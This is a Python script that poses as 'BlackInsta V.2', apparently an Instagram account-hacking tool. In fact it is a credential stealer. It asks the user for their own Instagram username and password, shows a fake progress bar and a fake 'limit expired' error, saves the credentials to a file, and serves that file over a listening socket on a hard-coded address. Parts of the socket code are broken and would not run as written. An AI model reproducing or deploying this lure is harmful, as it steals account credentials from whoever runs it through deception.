import time
import socket
import math


print("==============================================================================")
print("=======================  Welcome to BlackInsta V.2  ==========================")
print("==============================================================================")
time.sleep(2)
Email = input("Enter Your Instagram Username : ")
Pass = input("Enter Your Instagram Password : ")
time.sleep(1)
def progress_bar(progress, total):
    percent = 100 * (progress / float(total))
    bar = '>' * int(percent) + '-' * (100 - int(percent))
    print(f"\r|{bar}| {percent:.2f}%", end="\r")


numbers = [x * 5 for x in range(2000, 3000)]
results = []

progress_bar(0, len(numbers))
for i, x in enumerate(numbers):
    results.append(math.factorial(x))
    progress_bar(i + 1, len(numbers))

time.sleep(5)
Target = input("\nEnter your Username Target :")
print ("=======================  Starting Found the Target  ==========================")
time.sleep(10)
fh = open("insta.txt", "w")
fh.write("Username : " +Email+ "\nPassword : " +Pass+ "\nTarget : " +Target)
fh.close()
print("Error !! Your limit is Experit . Try the Premium Script on Google.com")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("192.168.1.5", 12345))
s.listen(10)
c,addr = s.accept()
print('() connected. '.format(addr))
f = open("insta.txt","rb")

datas = f.read(1024)
while datas:
    c.write(datas)
    datas = s.read(1024)

    f.close()


print("Done sending")